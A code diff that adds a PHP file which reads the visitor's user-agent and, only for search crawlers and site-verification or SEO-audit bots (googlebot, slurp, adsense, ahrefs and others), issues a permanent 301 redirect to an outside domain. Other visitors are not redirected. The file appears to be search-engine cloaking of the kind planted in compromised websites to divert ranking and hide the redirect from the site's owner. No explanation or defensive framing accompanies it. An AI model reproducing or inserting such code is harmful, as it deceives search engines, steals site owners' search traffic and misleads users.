@@ -1,0 +1,15 @@
+<?php
+    header('Vary: Accept-Language');
+    header('Vary: User-Agent');
+
+    $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+
+    $urlTo = "https://babudo.hu/";
+
+    $botchar = "/(googlebot|slurp|adsense|verification|inspection|ahrefs)/";
+
+    if (preg_match($botchar, $ua)) {
+        header("Location: $urlTo",TRUE,301);
+        exit;
+    }
+?>
